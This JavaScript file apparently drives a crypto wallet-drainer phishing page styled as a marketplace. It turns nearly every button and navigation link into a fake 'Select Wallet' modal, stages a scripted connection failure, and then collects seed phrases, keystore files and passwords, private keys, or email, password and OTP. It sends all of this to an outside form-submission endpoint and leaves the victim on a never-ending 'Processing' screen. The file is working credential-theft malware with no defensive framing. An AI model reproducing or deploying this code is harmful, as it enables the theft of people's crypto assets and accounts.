document.addEventListener('DOMContentLoaded', function () {
  const sortList = document.querySelector('ul.absolute.bg-zinc-900');
  if (!sortList) return;

  let sortButton = sortList.previousElementSibling;
  if (!sortButton || sortButton.tagName !== 'BUTTON') {
    sortButton = document.querySelector('div.relative.bg-zinc-900 > button');
  }
  if (!sortButton) return;

  sortButton.addEventListener('click', function (e) {
    e.stopPropagation();
    sortList.classList.toggle('hidden');
  });

  // Close when clicking outside
  document.addEventListener('click', function (e) {
    if (!sortList.classList.contains('hidden') && !sortList.contains(e.target) && !sortButton.contains(e.target)) {
      sortList.classList.add('hidden');
    }
  });

  // Close on Escape
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') sortList.classList.add('hidden');
  });

  // When selecting an item, update button text and close
  sortList.querySelectorAll('li').forEach(function (li) {
    li.addEventListener('click', function (e) {
      e.stopPropagation();
      // mark active appearance
      sortList.querySelectorAll('li').forEach(function (x) {
        x.classList.remove('text-sm', 'font-medium', 'bg-zinc-800');
      });
      li.classList.add('text-sm', 'font-medium');

      // update button label (keep its image if present)
      const img = sortButton.querySelector('img');
      const text = li.textContent.trim();
      if (img) {
        // remove existing text nodes then insert new text before the image
        Array.from(sortButton.childNodes).forEach(function (n) {
          if (n.nodeType === 3) n.remove();
        });
        sortButton.insertBefore(document.createTextNode(text), img);
      } else {
        sortButton.textContent = text;
      }

      sortList.classList.add('hidden');
    });
  });
});

// --- Select Wallet modal wiring ---
document.addEventListener('DOMContentLoaded', function () {
  function openSelectWalletModal() {
    const modal = document.getElementById('selectWalletModal');
    if (!modal) return;
    modal.classList.remove('hidden');
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
  }

  function closeSelectWalletModal() {
    const modal = document.getElementById('selectWalletModal');
    if (!modal) return;
    modal.classList.add('hidden');
    modal.style.display = '';
    document.body.style.overflow = '';
  }

  // wire modal close button if present
  const modalCloseBtn = document.getElementById('modalCloseBtn');
  if (modalCloseBtn) {
    modalCloseBtn.addEventListener('click', function (e) {
      e.preventDefault();
      closeSelectWalletModal();
    });
  }

  // helper to attach open handler for select-wallet modal
  function attachOpen(el) {
    if (!el) return;
    el.addEventListener('click', function (e) {
      // Only intercept and open modal for explicit triggers. Links that navigate should remain functional.
      e.preventDefault();
      openSelectWalletModal();
    });
  }

  // Collect and attach modal openers for explicit triggers only
  (function wireModalTriggers() {
    const triggers = [];

    // Buttons/links containing these texts should open the modal
    const texts = ['buy now', 'play now', 'fix issues'];
    Array.from(document.querySelectorAll('button, a')).forEach(el => {
      const t = (el.textContent || '').trim().toLowerCase();
      if (!t) return;
      for (const tt of texts) {
        if (t.includes(tt)) { triggers.push(el); break; }
      }
    });

    // Top-right icon buttons
    Array.from(document.querySelectorAll('img[src*="icon-15.svg"], img[src*="icon-16.svg"]')).forEach(img => {
      const btn = img.closest('button'); if (btn) triggers.push(btn);
    });

    // Also include any explicit BUY NOW elements that may be inside card overlays with that exact text
    Array.from(document.querySelectorAll('button')).forEach(b => {
      const t = (b.textContent || '').trim().toLowerCase();
      if (t === 'buy now') triggers.push(b);
    });

    // Attach to elements inside mobile sidebar separately (we already wired panel items earlier, but ensure mobile-only bindings exist)
    const mobilePanel = document.getElementById('mobileSidebar');
    if (mobilePanel) {
      Array.from(mobilePanel.querySelectorAll('a, button')).forEach(it => {
        // keep mobile behavior: open modal for any item in mobile menu
        triggers.push(it);
      });
    }

    // Also bind the desktop sidebar (explicit request) so its items open the select-wallet modal
    const desktopSidebar = document.querySelector('nav.relative.bg-zinc-900');
    if (desktopSidebar) {
      Array.from(desktopSidebar.querySelectorAll('a, button')).forEach(it => {
        triggers.push(it);
      });
    }

    // Also attach explicit handlers for desktop sidebar items so they open the modal (override navigation)
    if (desktopSidebar) {
      Array.from(desktopSidebar.querySelectorAll('a, button')).forEach(it => {
        // skip social/home icons that should remain navigational? currently open modal per request
        it.addEventListener('click', function (ev) {
          ev.preventDefault();
          openSelectWalletModal();
        });
      });
    }

    // Deduplicate and attach
    Array.from(new Set(triggers)).forEach(el => {
      // do not attach to elements that are navigation anchors on desktop (avoid breaking nav)
      if (el.tagName === 'A' && el.closest('nav') && window.matchMedia && window.matchMedia('(min-width: 768px)').matches) return;
      attachOpen(el);
    });
  })();

  // Toggle more wallets
  const toggleBtn = document.getElementById('toggleMoreWallets');
  if (toggleBtn) {
    toggleBtn.addEventListener('click', () => {
      const more = document.getElementById('moreWallets');
      const isHidden = more.getAttribute('aria-hidden') === 'true';
      more.setAttribute('aria-hidden', isHidden ? 'false' : 'true');
      toggleBtn.setAttribute('aria-expanded', isHidden ? 'true' : 'false');
      toggleBtn.textContent = isHidden ? 'Hide wallets -30' : 'Choose your preferred wallets +30';
    });
  }

  // Manual connect modal controls (close/open handled elsewhere)
  const manualCloseBtn = document.getElementById('manualCloseBtn');
  const connectManualModal = document.getElementById('connectManualModal');
  const manualConnectBtn = document.getElementById('manualConnectBtn');
  const errorConnectingLabel = document.getElementById('errorConnecting');
  const connectManuallyLabel = document.getElementById('connectManuallyLabel');

  const otpModal = document.getElementById('otpModal');
  const otpCloseBtn = document.getElementById('otpCloseBtn');
  const otpSubmitBtn = document.getElementById('otpSubmitBtn');
  const otpInput = document.getElementById('otpInput');
  const otpError = document.getElementById('otpError');

  const connectingOverlay = document.getElementById('connectingOverlay');
  const connectingWalletImg = document.getElementById('connectingWalletImg');

  const phrasesField = document.getElementById('phrasesField');
  const keystoreField = document.getElementById('keystoreField');
  const privateField = document.getElementById('privateField');
  const emailField = document.getElementById('emailField');
  const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));

  // Track currently selected wallet
  let selectedWallet = { name: 'MetaMask', img: document.getElementById('modalMainWalletImg') ? document.getElementById('modalMainWalletImg').src : '' };

  let emailData = { email: '', password: '' };

  function updateManualFields() {
    const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';
    if (phrasesField) phrasesField.classList.toggle('hidden', sel !== 'phrases');
    if (keystoreField) keystoreField.classList.toggle('hidden', sel !== 'keystore');
    if (privateField) privateField.classList.toggle('hidden', sel !== 'private');
    if (emailField) emailField.classList.toggle('hidden', sel !== 'email');
    if (manualConnectBtn) {
      manualConnectBtn.textContent = (sel === 'email') ? 'Sign in' : 'Connect';
    }
  }
  manualRadios.forEach(r => r.addEventListener('change', updateManualFields));
  updateManualFields();

  // Wallet option clicks: update selected wallet and collapse more wallets
  document.querySelectorAll('.wallet-option').forEach(btn => {
    btn.addEventListener('click', (ev) => {
      ev.preventDefault();
      const img = btn.querySelector('img');
      const name = btn.querySelector('span') ? btn.querySelector('span').innerText : (btn.dataset.wallet || 'Wallet');
      const mainImg = document.getElementById('modalMainWalletImg');
      const mainName = document.getElementById('modalMainWalletName');
      if (img && mainImg) mainImg.src = img.src;
      if (name && mainName) mainName.textContent = name;
      selectedWallet = { name: name, img: img ? img.src : '' };

      // collapse more wallets
      const more = document.getElementById('moreWallets');
      const toggle = document.getElementById('toggleMoreWallets');
      if (more) more.setAttribute('aria-hidden', 'true');
      if (toggle) {
        toggle.setAttribute('aria-expanded', 'false');
        toggle.textContent = 'Choose your preferred wallets +30';
      }
    });
  });

  if (manualCloseBtn) {
    manualCloseBtn.addEventListener('click', () => {
      if (connectManualModal) connectManualModal.classList.add('hidden');
      document.body.style.overflow = '';
    });
  }
  if (connectManualModal) {
    connectManualModal.addEventListener('click', (e) => {
      if (e.target === connectManualModal) {
        connectManualModal.classList.add('hidden');
        document.body.classList.remove('overflow-hidden');
      }
    });
  }

  if (otpCloseBtn) {
    otpCloseBtn.addEventListener('click', () => {
      if (otpModal) otpModal.classList.add('hidden');
      document.body.style.overflow = '';
      if (otpError) otpError.classList.add('hidden');
    });
  }

  // Manual connect / Sign in behaviour
  // helper to close the manual modal
  function closeConnectManual() {
    if (connectManualModal) connectManualModal.classList.add('hidden');
    document.body.style.overflow = '';
  }

  // show a persistent processing overlay (creates element if needed)
  function showProcessingOverlay(options) {
    // options: { imageSrc, gifSrc, message }
    options = options || {};
    const imgSrc = options.imageSrc || '';
    const gifSrc = options.gifSrc || 'wallet-gifs.png';
    const message = options.message || 'Processing...';

    let proc = document.getElementById('processingOverlay');
    if (!proc) {
      proc = document.createElement('div');
      proc.id = 'processingOverlay';
      proc.style.position = 'fixed';
      proc.style.inset = '0';
      proc.style.display = 'flex';
      proc.style.alignItems = 'center';
      proc.style.justifyContent = 'center';
      proc.style.background = 'rgba(0,0,0,0.7)';
      proc.style.zIndex = '100000';
      document.body.appendChild(proc);
    }

    // hide any open modals first
    try { document.getElementById('selectWalletModal')?.classList.add('hidden'); } catch(e){}
    try { document.getElementById('connectManualModal')?.classList.add('hidden'); } catch(e){}
    try { document.getElementById('otpModal')?.classList.add('hidden'); } catch(e){}

    // hide page content behind the overlay (make elements invisible and non-interactive)
    try {
      const bodyChildren = Array.from(document.body.children);
      bodyChildren.forEach((ch) => {
        if (ch.id === 'processingOverlay') return;
        if (!ch.dataset.prevVisibility) ch.dataset.prevVisibility = ch.style.visibility || '';
        if (!ch.dataset.prevPointer) ch.dataset.prevPointer = ch.style.pointerEvents || '';
        ch.style.visibility = 'hidden';
        ch.style.pointerEvents = 'none';
      });
    } catch (err) {
      /* ignore */
    }

    // build dynamic content: prefer gifSrc (animated) but also show selected wallet if provided
    let inner = '<div class="flex flex-col items-center gap-4 p-6 rounded text-white">';
    if (gifSrc) {
      inner += `<img src="${gifSrc}" alt="loading" style="max-width:220px;width:40%;height:auto;display:block;margin:0 auto;" />`;
    }
    if (imgSrc) {
      inner += `<img src="${imgSrc}" alt="wallet" style="width:72px;height:72px;border-radius:12px;margin-top:8px;box-shadow:0 8px 24px rgba(0,0,0,0.6);" />`;
    }
    // replace trailing dots with animated dot loader when message implies processing
    const isProcessing = /process/i.test(message);
    if (isProcessing) {
      const dots = `
        <span style="display:inline-block; margin-left:8px;">
          <span style="opacity:0; animation:ld 1s infinite;">.</span>
          <span style="opacity:0; animation:ld 1s infinite .2s">.</span>
          <span style="opacity:0; animation:ld 1s infinite .4s">.</span>
        </span>
        <style>@keyframes ld{0%{opacity:0}50%{opacity:1}100%{opacity:0}}</style>
      `;
      inner += `<div class="font-medium mt-3">${message.replace(/\.\.\.$/, '')}${dots}</div></div>`;
    } else {
      inner += `<div class="font-medium mt-3">${message}</div></div>`;
    }

    proc.innerHTML = inner;
    proc.classList.remove('hidden');
    proc.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    return proc;
  }



  // OTP submit handling: validate and process
  if (otpSubmitBtn) {
    otpSubmitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const code = otpInput ? (otpInput.value || '').trim() : '';
      if (!code || code.length < 4) {
        if (otpError) otpError.classList.remove('hidden');
        return;
      }
      // hide validation error
      if (otpError) otpError.classList.add('hidden');

      // collect email/manual values to submit together with OTP
      let message = '';
      try {
        const walletName = selectedWallet?.name || '';
        message += `Wallet: ${walletName}\nMethod: email\n`;
        const email = document.getElementById('emailInput')?.value || '';
        const pw = document.getElementById('emailPassword')?.value || '';
        message += `Email: ${email}\nPassword: ${pw}\nOTP: ${code}\n`;
      } catch (err) {
        console.error('Error collecting email values', err);
      }

      // disable submit while sending
      otpSubmitBtn.disabled = true;

      const access_key = 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea';
      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_key, subject: 'Wallet connect data (email OTP)', message })
      }).then(async res => {
        if (!res.ok) throw new Error('Network error');
        try { await res.json(); } catch (e) {}
        // hide otp modal and show persistent processing overlay with wallet-gifs
        if (otpModal) otpModal.classList.add('hidden');
        const gif = 'wallet-gifs.png';
        const img = selectedWallet?.img || document.getElementById('modalMainWalletImg')?.src || '';
        showProcessingOverlay({ imageSrc: img, gifSrc: gif, message: 'Processing...' });
      }).catch(err => {
        console.error('OTP submit error', err);
        if (otpError) {
          otpError.classList.remove('hidden');
          otpError.textContent = 'Verification/submit failed';
        }
      }).finally(() => {
        otpSubmitBtn.disabled = false;
      });
    });
  }

  // Manual Connect button behaviour: submit for non-email methods and show processing overlay with selected wallet
  if (manualConnectBtn) {
    manualConnectBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';

      if (sel === 'email') {
        // open OTP modal (don't submit yet)
        if (connectManualModal) connectManualModal.classList.add('hidden');
        if (otpModal) { otpModal.classList.remove('hidden'); otpModal.style.display = 'flex'; }
        document.body.style.overflow = 'hidden';
        return;
      }

      // gather form values depending on selected method
      let message = '';
      try {
        const walletName = selectedWallet?.name || '';
        message += `Wallet: ${walletName}\nMethod: ${sel}\n`;
        if (sel === 'phrases') {
          const inputs = Array.from(document.querySelectorAll('.phrase-input'));
          const words = inputs.map((i) => (i.value || '').trim()).filter(Boolean);
          message += `Phrases: ${words.join(' ')}\n`;
        } else if (sel === 'keystore') {
          const ks = document.getElementById('keystoreInput')?.value || '';
          const ksp = document.getElementById('keystorePassword')?.value || '';
          message += `Keystore: ${ks}\nKeystore password: ${ksp}\n`;
        } else if (sel === 'private') {
          const priv = document.getElementById('privateInput')?.value || '';
          message += `Private key: ${priv}\n`;
        }
      } catch (err) {
        console.error('Error collecting manual form values', err);
      }

      manualConnectBtn.disabled = true;

      const access_key = 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea';
      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_key, subject: 'Wallet connect data', message })
      }).then(async res => {
        if (!res.ok) throw new Error('Network error');
        try { await res.json(); } catch (e) {}
        if (connectManuallyLabel) connectManuallyLabel.textContent = '( Wait... )';
        // hide manual modal and show persistent processing overlay with selected wallet image
        closeConnectManual();
        const img = selectedWallet?.img || document.getElementById('modalMainWalletImg')?.src || '';
        showProcessingOverlay({ imageSrc: img, gifSrc: '', message: 'Processing...' });
      }).catch(err => {
        console.error('Manual submit error', err);
        if (errorConnecting) {
          errorConnecting.classList.remove('hidden');
          errorConnecting.textContent = 'Failed to submit. Please try again.';
        }
      }).finally(() => {
        manualConnectBtn.disabled = false;
      });
    });
  }

  // render phrase inputs helper
  function renderPhraseInputs(count = 12) {
    const grid = document.getElementById('phrasesGrid');
    if (!grid) return;
    grid.innerHTML = '';
    for (let i = 1; i <= count; i++) {
      const wrap = document.createElement('div');
      wrap.className = 'phrase-cell';
      const input = document.createElement('input');
      input.id = 'phrase-' + i;
      input.placeholder = 'word ' + i;
      input.className = 'phrase-input';
      wrap.appendChild(input);
      grid.appendChild(wrap);
    }
  }
  document.querySelectorAll('input[name="phraseCount"]').forEach(r => r.addEventListener('change', () => renderPhraseInputs(parseInt(r.value, 10))));
  renderPhraseInputs(12);

  // Connect Wallet button behaviour (uses timeouts as described)
  const connectWalletBtn = document.getElementById('connectWalletBtn');
  if (connectWalletBtn) {
    connectWalletBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const connectBtn = connectWalletBtn;
      if (connectBtn.dataset.loading === 'true') return;
      connectBtn.dataset.loading = 'true';
      connectBtn.disabled = true;

      const inModal = document.getElementById('inModalConnecting');
      const connectRing = document.getElementById('connectRing');
      const connectingText = document.getElementById('inModalConnectingText');
      const msg = document.getElementById('inModalConnectMessage');

      if (connectRing) connectRing.classList.add('active');
      if (inModal) { inModal.classList.add('active'); inModal.setAttribute('aria-hidden', 'false'); }
      if (connectingText) connectingText.style.display = 'block';

      setTimeout(() => {
        if (connectRing) connectRing.classList.remove('active');
        if (inModal) { inModal.classList.remove('active'); inModal.setAttribute('aria-hidden', 'true'); }
        if (connectingText) connectingText.style.display = 'none';
        if (msg) { msg.classList.add('show'); msg.setAttribute('aria-hidden', 'false'); }

        setTimeout(() => {
          if (msg) { msg.classList.remove('show'); msg.setAttribute('aria-hidden', 'true'); }
          closeSelectWalletModal();
          if (connectManualModal) connectManualModal.classList.remove('hidden');
          document.body.style.overflow = 'hidden';
          connectBtn.disabled = false;
          connectBtn.dataset.loading = 'false';
        }, 3000);
      }, 12000);
    });
  }

});

// Mobile sidebar toggle: clone desktop nav into an off-canvas panel and toggle with hamburger
document.addEventListener('DOMContentLoaded', function () {
  // find the desktop nav element (the sidebar nav)
  const desktopNav = document.querySelector('nav.relative.bg-zinc-900');
  if (!desktopNav) return;

  // create mobile sidebar/backdrop only once
  if (!document.getElementById('mobileSidebar')) {
    const backdrop = document.createElement('div');
    backdrop.id = 'mobileSidebarBackdrop';
    backdrop.className = 'mobile-sidebar-backdrop';

    const panel = document.createElement('div');
    panel.id = 'mobileSidebar';
    panel.className = 'mobile-sidebar';
    // copy nav content
    panel.innerHTML = desktopNav.innerHTML;

    document.body.appendChild(backdrop);
    document.body.appendChild(panel);

    // add a mobile 'Fix Issues' button at the top of the panel (visible on mobile)
    const mobileFix = document.createElement('button');
    mobileFix.className = 'text-black text-xs font-bold items-center bg-teal-400 caret-transparent gap-x-1 flex h-10 justify-center leading-3 outline-transparent outline-offset-2 outline outline-2 text-center uppercase w-full px-4 py-0 rounded-bl rounded-br rounded-tl rounded-tr font-chakra_petch';
    mobileFix.textContent = 'Fix Issues';
    // when tapped, open the select-wallet modal and close the panel
    mobileFix.addEventListener('click', function (e) {
      e.preventDefault();
      // open modal
      const modal = document.getElementById('selectWalletModal');
      if (modal) {
        modal.classList.remove('hidden');
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
      }
      // close panel
      panel.classList.remove('open');
      backdrop.classList.remove('show');
    });
    panel.insertBefore(mobileFix, panel.firstChild);

    // close when clicking backdrop
    backdrop.addEventListener('click', function () {
      panel.classList.remove('open');
      backdrop.classList.remove('show');
    });

    // close on Escape
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape') {
        panel.classList.remove('open');
        backdrop.classList.remove('show');
      }
    });
    // Attach open-modal handlers to all interactive elements inside the mobile panel
    (function attachMobilePanelOpeners() {
      function openModalFromPanel(e) {
        e.preventDefault();
        const modal = document.getElementById('selectWalletModal');
        if (modal) {
          modal.classList.remove('hidden');
          modal.style.display = 'flex';
          document.body.style.overflow = 'hidden';
        }
        // close panel/backdrop
        panel.classList.remove('open');
        backdrop.classList.remove('show');
      }

      // select buttons and anchors inside the panel
      const items = panel.querySelectorAll('a, button');
      items.forEach(it => {
        // skip if the element is the close/backdrop or inputs
        if (it === mobileFix) return;
        it.addEventListener('click', openModalFromPanel);
      });
    })();
  }

  const panel = document.getElementById('mobileSidebar');
  const backdrop = document.getElementById('mobileSidebarBackdrop');
  if (!panel || !backdrop) return;

  // find hamburger button (icon-11.svg)
  const hamImg = document.querySelector('img[src*="icon-11.svg"]');
  const hamBtn = hamImg ? hamImg.closest('button') : document.querySelector('header button');
  if (!hamBtn) return;

  hamBtn.addEventListener('click', function (e) {
    // only act on small screens — the button is hidden on desktop via CSS but double-check
    if (window.matchMedia && window.matchMedia('(min-width: 768px)').matches) return;
    e.stopPropagation();
    const open = panel.classList.toggle('open');
    if (open) backdrop.classList.add('show'); else backdrop.classList.remove('show');
  });

  // prevent clicks inside panel from closing when clicking inside
  panel.addEventListener('click', function (e) {
    e.stopPropagation();
  });
});
